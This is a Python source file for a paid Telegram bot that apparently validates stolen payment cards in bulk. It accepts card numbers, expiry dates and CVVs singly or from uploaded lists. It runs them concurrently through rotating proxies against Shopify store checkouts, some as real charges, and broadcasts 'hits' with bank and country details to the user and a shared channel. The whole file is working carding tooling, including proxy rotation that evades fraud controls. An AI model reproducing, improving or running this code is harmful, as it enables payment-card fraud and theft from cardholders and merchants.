import asyncio
import time
import random
from typing import Optional
from aiogram import Router, F
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.exceptions import TelegramRetryAfter
from config import (
    ADMIN_IDS,
    MAX_CARDS, GATEWAY_TIMEOUTS, FREE_USERS_BLOCKED, HIT_SEND_DELAY,
    HIT_CHAT_ID,
)
from helpers import get_html, escape, is_admin, can_use, btn, make_keyboard, copy_btn, url_btn
from shopify import check_card, parse_cards, luhn_valid
from data import (
    is_user_banned, register_user,
    save_check_result,
    get_gateways, count_gateways, get_apis, count_apis,
    get_user_proxies,
    get_all_global_proxies,
    count_user_proxies,
    increment_global_hit,
)
from ctools import get_bin_info
router = Router()
_PER_USER_CHECK_WORKERS = 50
_PER_USER_RETRY_WORKERS = 125
_S1 = "★━━━━━━━━━━━━━━★"
_S2 = "✧━━━━━━━━━━━━━━✧"
_DEV_ID   = ADMIN_IDS[0] if ADMIN_IDS else 0
_LIGHT = get_html("lightning1")
_BOT_USERNAME = "PAID_3BOT"
_BOT_LINE = f'[{get_html("lightning1")}] <b>𝐁𝐨𝐭:</b> <a href="https://t.me/PAID_3BOT">P3 Shopi</a>'
_cache_gateways: list = []
_cache_apis:     list = []
_cache_ts:       float = 0.0
_CACHE_TTL = 60.0 
async def _refresh_cache(force: bool = False):
    global _cache_gateways, _cache_apis, _cache_ts
    now = time.time()
    if not force and now - _cache_ts < _CACHE_TTL and _cache_gateways and _cache_apis:
        return
    try:
        cnt = await count_gateways()
        _cache_gateways = await get_gateways(limit=max(cnt, 1)) if cnt else []
        cnt2 = await count_apis()
        _cache_apis = await get_apis(limit=max(cnt2, 1)) if cnt2 else []
        _cache_ts = now
    except Exception as e:
        pass
def _pick_gw_api() -> tuple[Optional[dict], Optional[dict]]:
    if not _cache_gateways or not _cache_apis:
        return None, None
    gw  = dict(random.choice(_cache_gateways))
    api = random.choice(_cache_apis)
    gw["api_url"] = api["api_url"]
    gw["api_id"]  = api["id"]
    return gw, api

_NO_PROXY_MSG = (
    f"{get_html('denied')} <b>ACCESS DENIED — NO PROXIES FOUND</b>\n"
    f"{_S1}\n"
    f"{get_html('proxy')} <b>You must add proxies before checking cards!</b>\n\n"
    f"{get_html('lightning1')} <b>How to add proxies:</b>\n"
    f"  ➤ Send: <code>/proxy ip:port:user:pass</code>\n"
    f"  ➤ Or reply to a <b>.txt proxy file</b> with <code>/proxy</code>\n\n"
    f"{get_html('warning')} <b>Supported formats:</b>\n"
    f"  • <code>ip:port:user:pass</code>\n"
    f"  • <code>http://user:pass@ip:port</code>\n\n"
    f"{get_html('info')} <b>Need proxies?</b> Ask the admin for a proxy list.\n"
    f"{_S1}\n"
    f"{get_html('card')} <b>Checkers are proxy-locked for your security.</b>"
)

def _mask_card(card: str) -> str:
    p = card.split("|")
    if len(p) >= 4:
        cc = p[0]
        return f"{cc[:6]}{'*' * max(0, len(cc) - 10)}{cc[-4:]}|{p[1]}|{p[2]}|{p[3]}"
    return card

def _status_icon(status: str) -> str:
    if status == "Charge":
        return get_html("charge")
    if status == "Approved":
        return get_html("approved")
    if status == "Declined":
        return get_html("declined")
    return get_html("warning")

def _proxy_host(proxy: str) -> str:
    if not proxy:
        return "—"
    proxy = proxy.replace("http://", "").replace("https://", "").replace("socks5://", "")
    if "@" in proxy:
        return proxy.split("@")[-1]
    parts = proxy.split(":")
    if len(parts) >= 2:
        return f"{parts[0]}:{parts[1]}"
    return proxy

def _bar(current: int, total: int, length: int = 15) -> str:
    if total == 0:
        return "▱" * length
    filled = int((current / total) * length)
    return "▰" * filled + "▱" * (length - filled)

async def _safe_edit(msg: Message, text: str, markup=None):
    try:
        await msg.edit_text(text, parse_mode="HTML", reply_markup=markup)
    except TelegramRetryAfter as e:
        await asyncio.sleep(e.retry_after)
        try:
            await msg.edit_text(text, parse_mode="HTML", reply_markup=markup)
        except Exception:
            pass
    except Exception as e:
        if "message is not modified" not in str(e).lower():
            pass
async def _do_check(
    card: str,
    proxies: list[str],
    stop_event: asyncio.Event = None,
    retry_sem: asyncio.Semaphore = None,
) -> tuple:
    _proxies    = [p for p in proxies if p] or [""]
    attempt     = 0
    MAX_ATTEMPT = 12
    _BANK_RESPONSES = {
        "PROCESSING_ERROR", "THE SUM OF PROPOSED PAYMENTS CANNOT COVER THE TOTAL AMOUNT TO BE PAID.", "declined",
        "card_declined", "do_not_honor", "insufficient_funds",
        "stolen_card", "FRAUD_SUSPECTED", "ADDITIONAL ARTIFACT(S) IN SELLER: TRANSFORMER_FINGERPRINT",
        "DECISION_RULE_BLOCK", "transaction_not_allowed",
        "CREDIT CARD BRAND IS NOT SUPPORTED: DISCOVER", "INCORRECT_ZIP",
        "INCORRECT_CVC", "incorrect_number",
        "invalid_expiry_month", "invalid_expiry_year",
        "ORDER_PLACED", "MISSING INFORMATION",
        "card not supported",
        }
    def _is_real_bank_response(msg: str) -> bool:
        if not msg:
            return False
        m = msg.lower()
        for kw in _BANK_RESPONSES:
            if kw in m:
                return True
        _noise = ("curl", "proxy", "timeout", "timed out", "connection", "ssl", "socket",
                  "step 0", "step 1", "step 2", "network", "libcurl", "refused", "could not")
        return not any(n in m for n in _noise)

    while attempt < MAX_ATTEMPT:
        if stop_event and stop_event.is_set():
            return "Error", "Stopped", False, 0.0, 0.0, "", {}, ""
        gw, _ = _pick_gw_api()
        if not gw:
            await _refresh_cache(force=True)
            gw, _ = _pick_gw_api()
            if not gw:
                await asyncio.sleep(1.0)
                attempt += 1
                continue
        proxy = random.choice(_proxies)
        try:
            _sem = retry_sem or asyncio.Semaphore(1)
            async with _sem:
                result = await check_card(
                    card=card,
                    site=gw.get("site", ""),
                    api_url=gw["api_url"],
                    proxy=proxy,
                    timeout=GATEWAY_TIMEOUTS.get("Shopify", 40),
                )
                if len(result) == 6:
                    status, msg, is_live, price, elapsed, receipt_url = result
                else:
                    status, msg, is_live, price, elapsed = result
                    receipt_url = ""
            if status != "Error" and _is_real_bank_response(msg):
                gw["receipt_url"] = receipt_url or ""
                return status, msg, is_live, price, elapsed, proxy, gw, receipt_url
            attempt += 1
            await asyncio.sleep(min(0.1 * attempt, 1.0))
            continue
        except Exception:
            pass
        attempt += 1
        await asyncio.sleep(min(0.1 * attempt, 1.0))
    return "Error", "MaxRetries", False, 0.0, 0.0, "", {}, ""

def _stop_kb(user_id: int) -> InlineKeyboardMarkup:
    return make_keyboard([
        [btn("S T O P", f"msh_stop:{user_id}", style="danger")]
    ])
async def _send_hit(
    bot, uid: int, user, card: str,
    status: str, resp: str, price: float,
    elapsed: float, gw: dict, proxy: str, bin_info: dict,
    receipt_url: str = "",
):
    hit_number   = await increment_global_hit()
    first        = escape(user.first_name or "User")
    icon         = _status_icon(status)
    gateway_name = gw.get("name", "?") if gw else "?"
    gw_id        = gw.get("id", "") if gw else ""
    gate_display = f"{gateway_name}_V{gw_id}" if gw_id else gateway_name
    spoiler_card = f"<tg-spoiler>{card}</tg-spoiler>"
    bin_code     = card.split("|")[0][:6]

    if not bin_info:
        try:
            bin_info = await get_bin_info(bin_code)
        except Exception:
            bin_info = {}
    brand   = bin_info.get("brand", "UNKNOWN")
    btype   = bin_info.get("type", "UNKNOWN")
    bank    = bin_info.get("bank", "UNKNOWN")
    country = bin_info.get("country_name", "UNKNOWN")
    flag    = bin_info.get("country_flag", "")

    receipt_line = ""
    if status == "Charge" and receipt_url:
        receipt_line = f"[{_LIGHT}] <b>𝐑𝐞𝐜𝐞𝐢𝐩𝐭:</b> <b><a href=\"{receipt_url}\">Click Here</a></b>\n"

    bot_btn = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Copy CC", copy_text=__import__("aiogram").types.CopyTextButton(text=card)),
    ]])

    user_text_base = (
        f"<b>Shopify</b> [{_LIGHT}]\n"
        f"{_S1}\n"
        f"[{_LIGHT}] <b>𝐂𝐂:</b> {spoiler_card}\n"
        f"[{_LIGHT}] <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> <b>{status}</b> {icon}\n"
        f"[{_LIGHT}] <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <b>{resp}</b>\n"
        + receipt_line +
        f"[{_LIGHT}] <b>𝐆𝐚𝐭𝐞:</b> <b>{gate_display} — ${price:.2f}</b>\n"
        f"{_S1}\n"
        f"[{_LIGHT}] <b>𝐁𝐢𝐧:</b> <b>{bin_code} - {brand} - {btype}</b>\n"
        f"[{_LIGHT}] <b>𝐁𝐚𝐧𝐤:</b> <b>{bank}</b>\n"
        f"[{_LIGHT}] <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> <b>{country} {flag}</b>\n"
        f"{_S1}\n"
        f"[{_LIGHT}] <b>𝐓𝐢𝐦𝐞:</b> <b>{elapsed:.2f}s</b> {get_html('time')}\n"
        f"[{_LIGHT}] <b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲:</b> <b>{first}</b> {get_html('user')}\n"
        f"{_S1}\n"
        + _BOT_LINE
    )
    try:
        await bot.send_message(uid, user_text_base, parse_mode="HTML", reply_markup=bot_btn)
    except Exception:
        pass

    try:
        hit_receipt = f"[{_LIGHT}] <b>𝐑𝐞𝐜𝐞𝐢𝐩𝐭:</b> <b><a href=\"{receipt_url}\">Click Here</a></b>\n" if (status == "Charge" and receipt_url) else ""
        hit_text = (
            f"[{_LIGHT}] <b>𝗛𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱</b> {get_html('fire')}  #{hit_number}\n"
            f"{_S1}\n"
            f"[{_LIGHT}] <b>𝐔𝐬𝐞𝐫:</b> <b>{first}</b>\n"
            f"[{_LIGHT}] <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> <b>{status}</b> {icon}\n"
            f"[{_LIGHT}] <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <b>{resp}</b>\n"
            + hit_receipt +
            f"[{_LIGHT}] <b>𝐓𝐢𝐦𝐞:</b> <b>{elapsed:.2f}s</b> {get_html('time')}\n"
            f"[{_LIGHT}] <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> <b>{gate_display} — ${price:.2f}</b>\n"
            f"{_S1}\n"
            + _BOT_LINE
        )
        if HIT_CHAT_ID:
            if HIT_SEND_DELAY:
                await asyncio.sleep(HIT_SEND_DELAY)
            await bot.send_message(HIT_CHAT_ID, hit_text, parse_mode="HTML",
)
    except Exception:
        pass
@router.message(Command("sh", "chk"))
async def cmd_single(message: Message):
    try:
        uid  = message.from_user.id
        user = message.from_user
        await register_user(uid, user.username or "", user.first_name or "")

        if await is_user_banned(uid):
            await message.answer(f"{get_html('denied')} You are banned.", parse_mode="HTML")
            return
        if FREE_USERS_BLOCKED and not await can_use(uid):
            await message.answer(f"{get_html('denied')} No active subscription.", parse_mode="HTML")
            return
        if not is_admin(uid):
            proxy_count = await count_user_proxies(uid)
            if proxy_count == 0:
                await message.answer(_NO_PROXY_MSG, parse_mode="HTML")
                return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            await message.answer(
                f"{get_html('warning')} Usage: <code>/sh CC|MM|YY|CVV</code>",
                parse_mode="HTML"
            )
            return

        card = parts[1].strip()
        p    = card.split("|")
        if len(p) < 4:
            await message.answer(
                f"{get_html('error')} Invalid card format. Use: <code>CC|MM|YY|CVV</code>",
                parse_mode="HTML"
            )
            return
        cc = p[0]
        if not luhn_valid(cc):
            await message.answer(f"{get_html('error')} Invalid Luhn.", parse_mode="HTML")
            return
        await _refresh_cache()
        if not _cache_gateways:
            await message.answer(f"{get_html('error')} No gateways available. Contact admin.", parse_mode="HTML")
            return
        if not _cache_apis:
            await message.answer(f"{get_html('error')} No APIs available. Contact admin.", parse_mode="HTML")
            return
        proxies  = await get_user_proxies(uid)
        if not proxies:
            proxies = [""]
        wait_msg = await message.answer(f"{get_html('time')} <b>Checking...</b>", parse_mode="HTML")
        t0       = time.time()
        status, resp_msg, is_live, price, elapsed, used_proxy, gw, receipt_url = await _do_check(card, proxies)
        total_time = time.time() - t0
        bin_info     = await get_bin_info(cc[:6])
        gateway_name = gw.get("name", "?") if gw else "?"
        gw_id        = gw.get("id", "") if gw else ""
        gate_display = f"{gateway_name}_V{gw_id}" if gw_id else gateway_name
        try:
            await wait_msg.delete()
        except Exception:
            pass
        first    = escape(user.first_name or "User")
        icon     = _status_icon(status)
        bin_code = cc[:6]
        if is_live:
            await _send_hit(
                message.bot, uid, user, card, status, resp_msg,
                price, total_time, gw, used_proxy, bin_info, receipt_url
            )
            await save_check_result(uid, card, status, resp_msg, price, elapsed, gateway_name, used_proxy)
        else:
            text = (
                f"<b>Shopify</b> [{_LIGHT}]\n"
                f"{_S1}\n"
                f"[{_LIGHT}] <b>𝐂𝐂:</b> <tg-spoiler>{card}</tg-spoiler>\n"
                f"[{_LIGHT}] <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> {status} {icon}\n"
                f"[{_LIGHT}] <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {resp_msg}\n"
                f"[{_LIGHT}] <b>𝐆𝐚𝐭𝐞:</b> {gate_display} — ${price:.2f}\n"
                f"{_S1}\n"
                f"[{_LIGHT}] <b>𝐁𝐢𝐧:</b> {bin_code} - {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')}\n"
                f"[{_LIGHT}] <b>𝐁𝐚𝐧𝐤:</b> {bin_info.get('bank', 'UNKNOWN')}\n"
                f"[{_LIGHT}] <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {bin_info.get('country_name', 'UNKNOWN')} {bin_info.get('country_flag', '')}\n"
                f"{_S1}\n"
                f"[{_LIGHT}] <b>𝐓𝐢𝐦𝐞:</b> {total_time:.2f}s {get_html('time')}\n"
                f"[{_LIGHT}] <b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲:</b> {first} {get_html('user')}\n"
                f"{_S1}\n"
                + _BOT_LINE
            )
            await message.answer(text, parse_mode="HTML")
    except Exception as e:
        try:
            await message.answer(f"{get_html('error')} An error occurred. Check logs.")
        except Exception:
            pass
_active: dict[int, asyncio.Event] = {}
@router.message(Command("msh", "mass"))
async def cmd_mass(message: Message):
    try:
        uid  = message.from_user.id
        user = message.from_user
        await register_user(uid, user.username or "", user.first_name or "")
        if await is_user_banned(uid):
            await message.answer(f"{get_html('denied')} You are banned.", parse_mode="HTML")
            return
        if FREE_USERS_BLOCKED and not await can_use(uid):
            await message.answer(f"{get_html('denied')} No active subscription.", parse_mode="HTML")
            return
        if not is_admin(uid):
            proxy_count = await count_user_proxies(uid)
            if proxy_count == 0:
                await message.answer(_NO_PROXY_MSG, parse_mode="HTML")
                return
        if uid in _active:
            await message.answer(f"{get_html('warning')} You already have an active check.", parse_mode="HTML")
            return

        if not message.reply_to_message or not message.reply_to_message.document:
            await message.answer(
                f"{get_html('warning')} Reply to a .txt file containing cards.",
                parse_mode="HTML"
            )
            return
        await _refresh_cache()
        if not _cache_gateways:
            await message.answer(f"{get_html('error')} No gateways available. Contact admin.", parse_mode="HTML")
            return
        if not _cache_apis:
            await message.answer(f"{get_html('error')} No APIs available. Contact admin.", parse_mode="HTML")
            return
        file    = await message.bot.get_file(message.reply_to_message.document.file_id)
        content = await message.bot.download_file(file.file_path)
        text    = content.read().decode("utf-8", errors="ignore")
        cards   = parse_cards(text, MAX_CARDS)
        if not cards:
            await message.answer(f"{get_html('error')} No valid cards found.", parse_mode="HTML")
            return
        pool = await get_all_global_proxies()
        if pool:
            random.shuffle(pool)
            proxies = pool
        else:
            proxies = [""]
        pool_count = len([p for p in proxies if p])
        total      = len(cards)
        _init_text = (
            f"{get_html('time')} 0.0s  |  0.00s  |  0 c/s\n"
            f"[{_bar(0, total)}]  0%  0/{total}\n"
            f"{_S2}\n"
            f"<blockquote>"
            f"{get_html('card')} Card: —\n"
            f"{get_html('warning')} Checking..."
            f"</blockquote>\n"
            f"{_S2}\n"
            f"<blockquote>"
            f"{get_html('fire')} Charge: 0  •  {get_html('approved')} Approved: 0\n"
            f"{get_html('declined')} Declined: 0  •  {get_html('warning')} Error: 0"
            f"</blockquote>\n"
            f"{_S2}\n"
            f"<blockquote>"
            f"{get_html('gate')} Gate: — — $0.00\n"
            f"{get_html('info')} Api: <b>0</b>\n"
            f"{get_html('proxy')} Pool: <b>{pool_count}</b> proxies"
            f"</blockquote>"
        )
        msg = await message.answer(_init_text, parse_mode="HTML", reply_markup=_stop_kb(uid))
        stop_event       = asyncio.Event()
        _active[uid]     = stop_event
        asyncio.create_task(
            _run_mass(uid, user, cards, proxies, msg, stop_event, message.bot)
        )
    except Exception as e:
        try:
            await message.answer(f"{get_html('error')} An error occurred. Check logs.")
        except Exception:
            pass
async def _run_mass(uid, user, cards, proxies, msg, stop_event, bot):
    try:
        total         = len(cards)
        processed     = 0
        charge        = approved = declined = error = 0
        last_card     = last_status = last_msg = ""
        last_price    = 0.0
        last_proxy    = ""
        last_api_time = 0.0
        last_gw: dict = {}
        _hits_log: list = []
        start         = time.time()
        sem           = asyncio.Semaphore(_PER_USER_CHECK_WORKERS)
        retry_sem     = asyncio.Semaphore(_PER_USER_RETRY_WORKERS)
        _last_edit    = [0.0]
        _next_iv      = [random.uniform(3.0, 5.0)]
        _lock         = asyncio.Lock()
        _sub_checked  = [0]

        async def _update():
            now = time.time()
            if now - _last_edit[0] < _next_iv[0]:
                return
            _last_edit[0] = now
            _next_iv[0]   = random.uniform(3.0, 5.0)
            elapsed   = now - start
            bar       = _bar(processed, total)
            pct       = int(processed / total * 100) if total else 0
            elapsed_s = f"{int(elapsed // 60)}m {int(elapsed % 60)}s" if elapsed >= 60 else f"{elapsed:.1f}s"
            api_s     = f"{last_api_time:.2f}s"
            cs        = f"{processed / elapsed:.1f}" if elapsed > 0 else "0"
            icon      = _status_icon(last_status) if last_status else ""
            proxy_h   = _proxy_host(last_proxy)
            masked    = f"<tg-spoiler>{last_card}</tg-spoiler>" if last_card else "—"
            gw_name   = last_gw.get("name", "?") if last_gw else "?"
            gw_id     = last_gw.get("id", "?") if last_gw else "?"
            api_id    = last_gw.get("api_id", "?") if last_gw else "?"
            gate_disp = f"{gw_name}_V{gw_id}" if gw_id != "?" else gw_name
            text = (
                f"{get_html('time')} {elapsed_s}  |  {api_s}  |  {cs} c/s\n"
                f"[{bar}]  {pct}%  {processed}/{total}\n"
                f"{_S2}\n"
                f"<blockquote>"
                f"{get_html('card')} Card: {masked}\n"
                f"{icon} {last_status} — {last_msg}"
                f"</blockquote>\n"
                f"{_S2}\n"
                f"<blockquote>"
                f"{get_html('fire')} Charge: {charge}  •  {get_html('approved')} Approved: {approved}\n"
                f"{get_html('declined')} Declined: {declined}  •  {get_html('warning')} Error: {error}"
                f"</blockquote>\n"
                f"{_S2}\n"
                f"<blockquote>"
                f"{get_html('gate')} Gate: {gate_disp} — ${last_price:.2f}\n"
                f"{get_html('info')} Api: <b>{api_id}</b>\n"
                f"{get_html('proxy')} Proxy: <code>{proxy_h}</code>"
                f"</blockquote>"
            )
            await _safe_edit(msg, text, _stop_kb(uid))
        async def _one(card):
            nonlocal processed, charge, approved, declined, error
            nonlocal last_card, last_status, last_msg, last_price, last_proxy, last_api_time, last_gw
            async with sem:
                if stop_event.is_set():
                    return
                async with _lock:
                    _sub_checked[0] += 1
                    do_sub_check = (_sub_checked[0] % 25 == 0)

                if do_sub_check and not is_admin(uid):
                    if not await can_use(uid):
                        stop_event.set()
                        return

                try:
                    status, resp, is_live, price, elapsed, proxy, gw, receipt_url = await _do_check(
                        card, proxies, stop_event, retry_sem
                    )
                except Exception as e:
                    status, resp, is_live, price, elapsed, proxy, gw, receipt_url = "Error", str(e)[:120], False, 0.0, 0.0, "", {}, ""
                async with _lock:
                    last_card     = card
                    last_status   = status
                    last_msg      = resp
                    last_price    = price
                    last_api_time = elapsed
                    last_proxy    = proxy
                    last_gw       = gw
                    processed    += 1

                    if not stop_event.is_set():
                        if status == "Charge":      charge   += 1
                        elif status == "Approved":  approved += 1
                        elif status == "Declined":  declined += 1
                        elif resp != "Stopped":     error    += 1

                if is_live:
                    try:
                        _hits_log.append((card, status, resp, price, gw.get("receipt_url", "")))
                        bin_info = await get_bin_info(card.split("|")[0][:6])
                        await _send_hit(bot, uid, user, card, status, resp, price, elapsed, gw, proxy, bin_info, receipt_url)
                        await save_check_result(uid, card, status, resp, price, elapsed, gw.get("name", ""), proxy)
                    except Exception:
                        pass
                await _update()
        tasks = [asyncio.create_task(_one(c)) for c in cards]
        async def _stop_watcher():
            await stop_event.wait()
            await asyncio.sleep(3)
            for t in tasks:
                if not t.done():
                    t.cancel()
        watcher = asyncio.create_task(_stop_watcher())
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            watcher.cancel()
            try:
                await watcher
            except asyncio.CancelledError:
                pass
            pending = [t for t in tasks if not t.done()]
            if pending:
                for t in pending:
                    t.cancel()
                await asyncio.gather(*pending, return_exceptions=True)

        _active.pop(uid, None)
        elapsed   = time.time() - start
        elapsed_s = f"{int(elapsed // 60)}m {int(elapsed % 60)}s" if elapsed >= 60 else f"{elapsed:.1f}s"
        cs_final  = f"{processed / elapsed:.1f}" if elapsed > 0 else "0"
        stopped   = stop_event.is_set()
        bar       = _bar(processed, total)
        pct       = int(processed / total * 100) if total else 0
        final = (
            f"{get_html('stop') if stopped else get_html('approved')} "
            f"<b>{'Stopped' if stopped else 'Done'}</b>\n"
            f"[{bar}]  {pct}%  {processed}/{total}\n"
            f"{_S2}\n"
            f"<blockquote>"
            f"{get_html('fire')} Charge: <b>{charge}</b>  •  {get_html('approved')} Approved: <b>{approved}</b>\n"
            f"{get_html('declined')} Declined: <b>{declined}</b>  •  {get_html('warning')} Error: <b>{error}</b>"
            f"</blockquote>\n"
            f"{_S2}\n"
            f"<blockquote>"
            f"{get_html('time')} Time: <b>{elapsed_s}</b>  |  <b>{cs_final} c/s</b>"
            f"</blockquote>"
        )
        await _safe_edit(msg, final)
        if _hits_log:
            try:
                from aiogram.types import BufferedInputFile
                lines = []
                lines.append("=" * 50)
                lines.append(f"  P3 SHOPI — Mass Check Results")
                lines.append(f"  Total: {processed} | Hits: {len(_hits_log)}")
                lines.append(f"  Charge: {charge} | Approved: {approved}")
                lines.append(f"  Time: {elapsed_s} | Speed: {cs_final} c/s")
                lines.append("=" * 50)
                lines.append("")
                for i, (c, st, rs, pr, ru) in enumerate(_hits_log, 1):
                    lines.append(f"[{i}] {st.upper()}")
                    lines.append(f"    Card    : {c}")
                    lines.append(f"    Response: {rs}")
                    lines.append(f"    Price   : ${pr:.2f}")
                    if ru:
                        lines.append(f"    Receipt : {ru}")
                    lines.append("")
                lines.append("=" * 50)
                lines.append(f"  Bot: @{_BOT_USERNAME}")
                lines.append("=" * 50)
                file_bytes = "\n".join(lines).encode("utf-8")
                file_obj   = BufferedInputFile(file_bytes, filename=f"hits_{uid}_{int(time.time())}.txt")
                caption    = (
                    f"{get_html('fire')} <b>Mass Check Complete</b>\n"
                    f"{_S2}\n"
                    f"{get_html('charge')} Charge: <b>{charge}</b>  •  {get_html('approved')} Approved: <b>{approved}</b>\n"
                    f"{get_html('time')} Time: <b>{elapsed_s}</b>  |  <b>{cs_final} c/s</b>\n"
                    f"{_S2}\n"
                    f"{get_html('star')} Hits: <b>{len(_hits_log)}</b> / {processed}"
                )
                await bot.send_document(uid, file_obj, caption=caption, parse_mode="HTML")
            except Exception:
                pass
    except Exception as e:
        _active.pop(uid, None)
        try:
            await _safe_edit(msg, f"{get_html('error')} Mass check failed. Check logs.")
        except Exception:
            pass
@router.callback_query(F.data.startswith("msh_stop:"))
async def cb_stop(call: CallbackQuery):
    try:
        await call.answer("Stopping...", show_alert=False)
        uid = int(call.data.split(":")[1])
        if call.from_user.id != uid and not is_admin(call.from_user.id):
            return
        ev = _active.get(uid)
        if ev:
            ev.set()
    except Exception as e:
        pass